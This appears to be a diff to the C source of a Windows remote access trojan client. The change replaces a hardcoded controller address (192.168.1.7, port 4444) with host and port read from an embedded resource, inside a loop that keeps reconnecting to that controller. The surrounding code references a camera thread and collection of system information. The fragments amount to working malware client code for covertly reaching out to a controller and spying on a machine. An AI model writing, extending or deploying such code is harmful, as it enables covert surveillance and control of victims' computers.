@@ -16,8 +16,6 @@
 
 #pragma comment(lib, "ws2_32.lib")
 
-#define HOST "192.168.1.7"
-#define PORT 4444
 int g_reconnect_delay = 5000;
 
 SessionKey g_session;
@@ -139,6 +137,13 @@ void camera_thread(void* arg) {
 int main() {
     WSADATA wsa;
     WSAStartup(MAKEWORD(2, 2), &wsa);
+
+    load_config_from_resource();
+    if (g_port == 0) {
+        // Fallback or exit if no config
+        // For now, let's keep some defaults or just wait for config
+    }
+
     g_send_mutex = CreateMutex(NULL, FALSE, NULL);
 
     char* info = collect_sysinfo();
@@ -147,8 +152,14 @@ int main() {
         g_sock = socket(AF_INET, SOCK_STREAM, 0);
         struct sockaddr_in server;
         server.sin_family = AF_INET;
-        server.sin_addr.s_addr = inet_addr(HOST);
-        server.sin_port = htons(PORT);
+        server.sin_addr.s_addr = (g_host[0] != 0) ? inet_addr(g_host) : INADDR_NONE;
+        server.sin_port = htons(g_port);
+
+        if (server.sin_addr.s_addr == INADDR_NONE || g_port == 0) {
+            closesocket(g_sock);
+            Sleep(g_reconnect_delay);
+            continue;
+        }
 
         if (connect(g_sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
             closesocket(g_sock);
